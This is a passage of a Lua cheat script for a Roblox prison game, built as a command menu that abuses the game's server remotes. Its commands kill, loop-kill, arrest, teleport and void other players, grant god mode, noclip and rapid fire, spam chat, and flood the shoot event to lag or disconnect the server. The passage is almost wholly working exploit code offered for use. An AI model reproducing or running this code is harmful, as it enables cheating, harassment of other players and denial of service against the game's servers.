				Notify("Killed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("killall") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					Kill(v)
				end
			end
			Notify("Killed all players", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("killinmate") or Command("killinmates") or Command("killsinmate") or Command("killsinmates") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					if v.TeamColor.Name == "Bright orange" then
						Kill(v)
					end
				end
			end
			Notify("Killed all inmates", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("killguard") or Command("killsguard") or Command("killguards") or Command("killsguards") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					if v.TeamColor.Name == "Bright blue" then
						Kill(v)
					end
				end
			end
			Notify("Killed all guards", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("killcriminal") or Command("killscriminal") or Command("killcriminals") or Command("killscriminals") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					if v.TeamColor.Name == "Really red" then
						Kill(v)
					end
				end
			end
			Notify("Killed all criminals", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopkill") or Command("loopkills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and not LoopKill[Player.UserId] then
				LoopKill[Player.UserId] = {Player = Player}
				Notify("Looping kills "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found / already loop kills", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("unloopkill") or Command("unloopkills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and LoopKill[Player.UserId] then
				LoopKill[Player.UserId] = nil
				Notify("Unloop kills "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found / Player has no loop kills", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("loopkillguard") or Command("loopkillguards") or Command("loopkillsguard") or Command("loopkillsguards") or Command("loopkillcop") or Command("loopkillpolices") or Command("loopkillspolices") then
			States.LoopKill_Guards = true
			Notify("Looping kills all guards", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.LoopKill_Guards then
					for i,v in pairs(game.Teams.Guards:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
									Kill(v)
								end
							end)
						end
					end
				end
			end
		end
		if Command("unloopkillguard") or Command("unloopkillguards") or Command("unloopkillsguard") or Command("unloopkillsguards") or Command("unloopkillcop") or Command("unloopkillpolices") or Command("unloopkillspolices") then
			States.LoopKill_Guards = false
			Notify("Unloop kills all guards", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopkillinmate") or Command("loopkillinmates") or Command("loopkillsinmate") or Command("loopkillsinmates") or Command("loopkillprisoner") or Command("loopkillprisoners") then
			States.LoopKill_Inmates = true
			Notify("Looping kills all inmates", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.LoopKill_Inmates then
					for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
									Kill(v)
								end
							end)
						end
					end
				end
			end
		end
		if Command("unloopkillinmate") or Command("unloopkillinmates") or Command("unloopkillsinmate") or Command("unloopkillsinmates") or Command("unloopkillprisoner") or Command("unloopkillprisoners") then
			States.LoopKill_Inmates = false
			Notify("Unloop kills all inmates", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopkillcriminal") or Command("loopkillcriminals") or Command("loopkillscriminal") or Command("loopkillscriminals") or Command("loopkillcrim") or Command("loopkillcrims") then
			States.LoopKill_Criminals = true
			Notify("Looping kills all criminals", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.LoopKill_Criminals then
					for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
									Kill(v)
								end
							end)
						end
					end
				end
			end
		end
		if Command("unloopkillcriminal") or Command("unloopkillcriminals") or Command("unloopkillscriminal") or Command("unloopkillscrriminals") or Command("unloopkillcrim") or Command("unloopkillcrims") then
			States.LoopKill_Criminals = false
			Notify("Unlooping kills all criminals", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopkillall") or Command("loopkillsall") then
			States.LoopKill_Others = true
			Notify("Looping kills all players", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.LoopKill_Others then
					for i,v in pairs(game.Players:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
									Kill(v)
								end
							end)
						end
					end
				end
			end
		end
		if Command("unloopkillall") or Command("unloopkillsall") then
			States.LoopKill_Criminals = false
			States.LoopKill_Guards = false
			States.LoopKill_Inmates = false
			States.LoopKill_Others = false
			Notify("Unlooping kills all players", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("goto") or Command("to") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[Player.Name].HumanoidRootPart.CFrame
				Notify("Go to "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("re") or Command("refresh") then
			if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
				if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
					local savedcf = GetPos()
					local savedcamcf = GetCamPos()
					workspace.Remote.loadchar:InvokeServer()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
					workspace.CurrentCamera.CFrame = savedcamcf
				end
			else
				if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
					local savedcf = GetPos()
					local savedcamcf = GetCamPos()
					workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
					workspace.CurrentCamera.CFrame = savedcamcf
					workspace.Remote.TeamEvent:FireServer("Medium stone grey")
				end
			end
			Notify("Refreshed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("res") or Command("respawn") then
			if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
				workspace.Remote.loadchar:InvokeServer()
			else
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
				workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			end
			Notify("Respawned", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("looparrest") or Command("spamarrest") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Notify("Spam arresting "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
				States.SpamArrest = true
				repeat wait()
					if game.Players[Player.Name] and States.SpamArrest then
						local Player_Previos_Team = Player.TeamColor.Name
						if Player.TeamColor.Name == "Bright orange" then
							Teleport(Player, CFrame.new(979.55584716797, 99.990005493164, 2341.4069824219))
						end
						if Player.TeamColor.Name ~= "Bright orange" and Player.TeamColor.Name ~= "Really red" then
							repeat Teleport(Player, CFrame.new(-976, 110, 2070)) until Player.TeamColor.Name == "Really red" or not game.Players[Player.Name]
						end
						if Player_Previos_Team == "Bright orange" then
							repeat wait()
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
								for i = 1,1000 do
									coroutine.wrap(function()
										ArrestEvent(Player, math.huge)
									end)()
								end
							until Player.Character.Head:FindFirstChild("handcuffedGui") or not game.Players[Player.Name]
						else
							if Player.TeamColor.Name == "Really red" then
								repeat wait()
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
									for i = 1,1000 do
										coroutine.wrap(function()
											ArrestEvent(Player, math.huge)
										end)()
									end
								until Player.Character.Head:FindFirstChild("handcuffedGui") or not game.Players[Player.Name]
							end
						end
					end
				until not game.Players[Player.Name] or not States.SpamArrest
			end
		end
		if Command("unlooparrest") or Command("unspamarrest") then
			States.SpamArrest = false
			Notify("Unspam arrest", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("view") or Command("spectate") or Command("watch") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Watching = Player
				Notify("Viewing "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
			while wait() do
				if Watching ~= nil then
					pcall(function()
						workspace.CurrentCamera.CameraSubject = workspace[Watching.Name]
					end)
				end
			end
		end
		if Command("antifling") then
			States.Anti_Fling = true
			Notify("Turn anti fling on", Color3.fromRGB(0, 255, 0), "Success")
			game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size = Vector3.new(math.huge, game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size.Y, math.huge)
			game.Players.LocalPlayer.CharacterAdded:Connect(function(Character)
				if States.Anti_Fling then
					pcall(function()
						game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size = Vector3.new(math.huge, game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size.Y, math.huge)
					end)
				end
			end)
		end
		if Command("statue") then
			States.Statue = true
			game.Players.LocalPlayer.Character:Connect(function()
				if States.Statue then

				end
			end)
		end
		if Command("unstatue") then
			States.Statue = false
		end
		if Command("noclip") or Command("noclips") then
			States.Noclips = true
			Notify("Turn no clips on", Color3.fromRGB(0, 255, 0), "Success")
			game:GetService("RunService").Stepped:Connect(function()
				if States.Noclips then
					pcall(function()
						game.Players.LocalPlayer.Character:FindFirstChild("Head").CanCollide = false
						game.Players.LocalPlayer.Character:FindFirstChild("Torso").CanCollide = false
					end)
				end
			end)
		end
		if Command("clip") or Command("clips") then
			States.Noclips = false
			Notify("Turn no clips off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("unantifling") then
			States.Anti_Fling = false
			Notify("Turn anti fling off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("antivest") or Command("anticrash") then
			States.Anti_Crash = true
			Notify("Turn anti armor spammer on", Color3.fromRGB(0, 255, 0), "Success")
			coroutine.wrap(function()
				while wait() do
					if States.Anti_Crash then
						for i,v in pairs(game.Players:GetPlayers()) do
							pcall(function()
								v.Character.vest:Destroy()
							end)
						end
					end
				end
			end)()
		end
		if Command("unantivest") or Command("unanticrash") then
			States.Anti_Crash = false
			Notify("Turn anti armor spammer off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("fastpunch") or Command("speedpunch") or Command("speedlypunch") or Command("superspeedpunch") then
			States.Fast_Punch = true
			Notify("Turn fast punch on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("slowpunch") or Command("normalspeedpunch") or Command("nofastpunch") or Command("unfastpunch") then
			States.Fast_Punch = false
			Notify("Turn fast punch off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("superpunch") or Command("onepunch") then
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local MeleeEvent = ReplicatedStorage:FindFirstChild("meleeEvent")
			local Mouse = game.Players.LocalPlayer:GetMouse()
			local Punch = false
			local Cooldown = false
			States.SuperPunch = true
			Notify("Turn super punch on", Color3.fromRGB(0, 255, 0), "Success")

			local function Punch()
				if not States.Fast_Punch then
					Cooldown = true
					local Part = Instance.new("Part", game.Players.LocalPlayer.Character)
					Part.Transparency = 1
					Part.Size = Vector3.new(5, 2, 3)
					Part.CanCollide = false
					local Weld = Instance.new("Weld", Part)
					Weld.Part0 = game.Players.LocalPlayer.Character.Torso
					Weld.Part1 = Part
					Weld.C1 = CFrame.new(0, 0, 2)
					Part.Touched:connect(function(Touch)
						if game.Players:FindFirstChild(Touch.Parent.Name) then
							local plr = game.Players:FindFirstChild(Touch.Parent.Name) 
							if plr.Name ~= game.Players.LocalPlayer.Name then
								Part:Destroy()
								for i = 1,100 do
									MeleeEvent:FireServer(plr)
								end
							end
						end
					end)
					wait(0.9)
					Cooldown = false
					Part:Destroy()
				else
					Cooldown = true
					local Part = Instance.new("Part", game.Players.LocalPlayer.Character)
					Part.Transparency = 1
					Part.Size = Vector3.new(5, 2, 3)
					Part.CanCollide = false
					local Weld = Instance.new("Weld", Part)
					Weld.Part0 = game.Players.LocalPlayer.Character.Torso
					Weld.Part1 = Part
					Weld.C1 = CFrame.new(0, 0, 2)
					Part.Touched:connect(function(Touch)
						if game.Players:FindFirstChild(Touch.Parent.Name) then
							local plr = game.Players:FindFirstChild(Touch.Parent.Name) 
							if plr.Name ~= game.Players.LocalPlayer.Name then
								Part:Destroy()
								for i = 1,100 do
									MeleeEvent:FireServer(plr)
								end
							end
						end
					end)
					wait(0.1)
					Cooldown = false
					Part:Destroy()
				end
			end
			Mouse.KeyDown:connect(function(Key)
				if not Cooldown and States.SuperPunch then
					if Key:lower() == "f" then
						Punch()
					end				
				end
			end)
		end
		if Command("normalpunch") or Command("oldpunch") or Command("nosuperpunch") or Command("stoponepunch") or Command("unonepunch") or Command("unsuperpunch") then
			States.SuperPunch = false
			Notify("Turn super punch off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("superknife") then
			local Knife = game.Players.LocalPlayer.Backpack:FindFirstChild("Crude Knife") or game.Players.LocalPlayer.Character:FindFirstChild("Crude Knife")
			if not Knife then
				workspace.Remote.ItemHandler:InvokeServer(workspace["Prison_ITEMS"].single["Crude Knife"].ITEMPICKUP)
			end
			wait()
			Knife = game.Players.LocalPlayer.Backpack:FindFirstChild("Crude Knife") or game.Players.LocalPlayer.Character:FindFirstChild("Crude Knife")
			if Knife then
				local Cooldown = false
				local Hitting = false
				local Hitted = false
				Knife.Equipped:Connect(function()
					Knife.Activated:Connect(function()
						if not Cooldown then
							Cooldown = true
							Hitting = true
							for i,v in pairs(Knife:GetChildren()) do
								if v:IsA("Part") then
									v.Touched:Connect(function(Hit)
										if Hit and Hit.Parent ~= game.Players.LocalPlayer and not Hitted and Hitting then
											Hitted = true
											for i = 1,25 do
												game.ReplicatedStorage.meleeEvent:FireServer(game.Players[Hit.Parent.Name])
											end
										end
									end)
								end
							end
							wait(0.5)
							Cooldown = false
							Hitting = false
							Hitted = false
						end
					end)
				end)
			end
			Notify("Obtained super knife", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("unview") or Command("unspectate") or Command("stopwatch") or Command("unwatch") then
			Watching = nil
			workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			Notify("Unviewed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("antivoid") or Command("antifell") then
			States.Anti_Void = true
			Notify("Turn anti void on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.Anti_Void then
					pcall(function()
						if game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y < 1 then
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(888, 100, 2388)
						end
					end)
				end
			end
		end
		if Command("unantivoid") or Command("unantifell") then
			States.Anti_Void = false
			Notify("Turn anti void off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("bring") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Teleport(GetPlayer(Arg2), game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
				Notify("Brought "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("teleport") or Command("tp") then
			local Player = GetPlayer(Arg2)
			local Player2 = GetPlayer(Arg3)
			if Player ~= nil and Player2 ~= nil then
				TeleportV(Player, Player2)
				Notify("Teleported "..Player.Name.." to "..Player2.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(0, 255, 0), "Error")
			end
		end
		if Command("void") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Teleport(Player, CFrame.new(999999, 999999, 999999))
				Notify("Voided "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("killaura") then
			States.Kill_Aura = true
			Notify("Turn kill aura on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("nokillaura") or Command("unkillaura") then
			States.Kill_Aura = false
			Notify("Turn kill aura off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("auto") or Command("autore") or Command("autorefresh") then
			States.Auto_Refresh = true
			Notify("Turn auto refresh on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.Auto_Refresh == true then
					pcall(function()
						if game.Players.LocalPlayer.Character.Humanoid.Health < 1 then
							if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
								if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
									local savedcf = GetPos()
									local savedcamcf = GetCamPos()
									workspace.Remote.loadchar:InvokeServer()
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
									workspace.CurrentCamera.CFrame = savedcamcf
								end
							else
								if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
									local savedcf = GetPos()
									local savedcamcf = GetCamPos()
									workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
									workspace.CurrentCamera.CFrame = savedcamcf
									workspace.Remote.TeamEvent:FireServer("Medium stone grey")
								end
							end
						end
					end)
				end
			end
		end
		if Command("unauto") or Command("auntore") or Command("unautorefresh") then
			States.Auto_Refresh = false
			Notify("Turn auto refresh off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("prefix") or Command("newprefix") or Command("changeprefix") then
			local NewPrefix = Arg2
			if NewPrefix ~= nil then
				Prefix = NewPrefix
				Execute.PlaceholderText = "Press "..Prefix.." To Enter"
				Notify("Changed prefix to "..NewPrefix, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Text needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("speed") or Command("walkspeed") or Command("setspeed") or Command("setwalkspeed") then
			local WalkSpeed = tonumber(Arg2)
			if WalkSpeed ~= nil then
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = WalkSpeed
				Notify("Changed walk speed to "..WalkSpeed, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("jumppower") or Command("jumphigh") or Command("setjumppower") then
			local JumpPower = tonumber(Arg2)
			if JumpPower ~= nil then
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
				Notify("Changed jump power to "..JumpPower, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("hipheight") or Command("sethipheight") then
			local HipHeight = tonumber(Arg2)
			if HipHeight ~= nil then
				game.Players.LocalPlayer.Character.Humanoid.HipHeight = HipHeight
				Notify("Changed hip height to "..HipHeight, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("lagserver") or Command("disconnect") then
			States.Lag_Server = true
			Notify("Lagging server", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.Lag_Server then
					coroutine.wrap(function()
						pcall(function()
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)

							local Gun = game.Players.LocalPlayer.Backpack["Remington 870"] or game.Players.LocalPlayer.Character["Remington 870"]

							local args = {
								[1] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [2] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [3] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [4] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [5] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [6] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [7] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [8] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}
							}

							game:GetService("ReplicatedStorage").ShootEvent:FireServer(args, Gun)
						end)
					end)()
				end
			end
		end
		if Command("unlagserver") or Command("stopdisconnect") or Command("undisconnect") then
			States.Lag_Server = false
			Notify("Unlagging server", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("gravity") or Command("setgravity") then
			local Gravity = tonumber(Arg2)
			if Gravity ~= nil then
				workspace.Gravity = Gravity
				Notify("Changed gravity to "..Gravity, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Count needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("makecrim") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Teleport(Player, CFrame.new(-919, 96, 2138))
				Notify("Crimmed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("resetgravity") or Command("regravity") then
			workspace.Gravity = 196.2
			Notify("Resetted gravity", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("resethipheight") or Command("rehipheight") then
			game.Players.LocalPlayer.Character.Humanoid.HipHeight = 0
			Notify("Resetted hip height", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("resetspeed") or Command("respeed") then
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
			Notify("Resetted walk speed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("resetjumppower") or Command("rejumppower") then
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
			Notify("Resetted jump power", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("leave") or Command("leaveserver") or Command("quit") then
			Notify("Leaving server", Color3.fromRGB(0, 255, 0), "Success")
			wait(.1)
			game:Shutdown()
		end
		if Command("rejoin") or Command("rj") then
			Notify("Rejoining server", Color3.fromRGB(0, 255, 0), "Success")
			wait(.1)
			game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
		end
		if Command("nodoors") or Command("deletedoors") then
			if workspace:FindFirstChild("Doors") then
				workspace.Doors.Parent = game.Lighting
			end
			Notify("Deleted doors", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("doors") or Command("restoredoors") then
			if game.Lighting:FindFirstChild("Doors") then
				game.Lighting.Doors.Parent = workspace
			end
			Notify("Restored doors", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("nowalls") or Command("deletedoors") then
			pcall(function()
				for i,v in pairs(Walls) do
					v.Parent = game.Lighting
				end
			end)
			Notify("Deleted walls", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("walls") or Command("restorewalls") then
			pcall(function()
				for i,v in pairs(game.Lighting:GetChildren()) do
					if v.Name ~= "Doors" then
						v.Parent = workspace
					end
				end
			end)
			Notify("Restored walls", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("god") or Command("godmode") then
			States.God_Mode = true
			Notify("Turn god mode on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.God_Mode then
					game.Players.LocalPlayer.Character.Humanoid.Name = 1
					local l = game.Players.LocalPlayer.Character["1"]:Clone()
					l.Parent = game.Players.LocalPlayer.Character
					l.Name = "Humanoid"
					game.Players.LocalPlayer.Character.Animate.Disabled = true
					wait()
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					game.Players.LocalPlayer.Character["1"]:Destroy()
					game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
					wait(5)
					local savedcf = GetPos()
					local savedcamcf = GetCamPos()
					local savedteam = GetTeam()
					workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new(savedteam).Name)
					workspace.CurrentCamera.CFrame = savedcamcf
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				end
			end
		end
		if Command("ungod") or Command("ungodmode") then
			States.God_Mode = false
			Notify("Turn god mode off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("arrest") or Command("handcuffs") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Arrest(Player, tonumber(Arg3))
				Notify("Arrested "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("arrestall") or Command("arrestother") or Command("arrestothers") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					if v.TeamColor.Name == "Really red" then
						Arrest(v, 30)
					end
				end
			end
			Notify("Arrested all criminals", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("opengate") then
			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"])
			Notify("Opened gate", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("getpos") then
			print("Humanoid Root Part Position :")
			print(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
			print("Camera CFrame :")
			print(workspace.CurrentCamera.CFrame)
			Notify("Printed positions", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("saveposition") or Command("savepos") then
			States.SavedCFrame = GetPos()
			Notify("Saved positions", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loadposition") or Command("loadpos") then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = States.SavedCFrame
			Notify("Loaded positions", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("spamchat") then
			States.SpamChat = true
			Notify("Spamming chat", Color3.fromRGB(0, 255, 0), "Success")
			if tonumber(Arg2) ~= nil then
				States.Spam_Wait = tonumber(Arg2)
			else
				States.Spam_Wait = 1
			end
			while wait() do
				if States.SpamChat then
					local MessagesToChat = {
						"I'm your dad",
						"I'm your mom",
						"I'm a god and I'm your dad",
						"__________",
						"OMG",
						"OML",
						"BEPP BOP BEEP BEEP BOP",
						" ",
						"I'm magic guy because i pressed W,A,S and D on my keyboard and my character can be walked wow, I'M THE REAL MAGIC GUY!",
						"I'M THE MOST PRO IN HERE",
						"I'M A PRO IN THIS SERVER ALL OF YOU ARE NOOB!",
						"LOL XD LOL XD LOL XD",
						"Read my chat",
						"Can you die while you are died?",
						"You know what, I'm a god",
						"Sub to CXZ NAME_R",
						"WOW",
						"wow",
						"\(￣︶￣*\))"
					}

					while true do
						wait(States.Spam_Wait)
						if States.SpamChat then
							pcall(function()
								Chat(MessagesToChat[math.random(1, #MessagesToChat)])
							end)
						end
					end
				end
			end
		end
		if Command("unspamchat") then
			States.SpamChat = false
			Notify("Unspamming chat", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("rapidfire") then
			local Tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
			local Name
			local Req
			if Tool then
				Notify("Activated rapid fire", Color3.fromRGB(0, 255, 0), "Success")
				States.CAN = true
				Name = Tool.Name
				if Tool:FindFirstChild("GunStates") then
					Req = require(Tool.GunStates)
					Req["MaxAmmo"] = Req["MaxAmmo"]
					Req["StoredAmmo"] = Req["StoredAmmo"]
					Req["AmmoPerClip"] = Req["AmmoPerClip"]
					Req["CurrentAmmo"] = Req["CurrentAmmo"]
					Req["FireRate"] = -math.huge
					Req["Bullets"] = 25
					Req["Range"] = math.huge
					Req["Damage"] = math.huge
					Req["ReloadTime"] = -math.huge
					Req["AutoFire"] = true
				end
			end
			while wait() do
				pcall(function()
					if game.Players.LocalPlayer.Character:FindFirstChild(Name) and States.CAN then
						if Req["CurrentAmmo"] < 1 then
							Tool:Destroy()
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver[Name].ITEMPICKUP)
							Tool = game.Players.LocalPlayer.Backpack:FindFirstChild(Name)
							if Tool then
								Name = Tool.Name
								Tool.Parent = game.Players.LocalPlayer.Character
								Tool = game.Players.LocalPlayer.Character[Name]
								Req = require(Tool.GunStates)
